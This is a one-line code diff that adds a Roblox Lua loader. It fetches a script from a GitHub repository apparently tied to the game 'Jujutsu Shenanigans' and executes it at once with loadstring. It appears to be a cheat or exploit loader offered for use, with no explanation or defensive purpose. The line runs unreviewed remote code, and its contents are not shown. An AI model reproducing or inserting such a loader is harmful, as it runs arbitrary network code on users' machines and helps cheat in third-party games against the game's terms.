@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://github.com/Frostrunsyou/Jijustu-chenanigas/blob/main/Jjs"))()
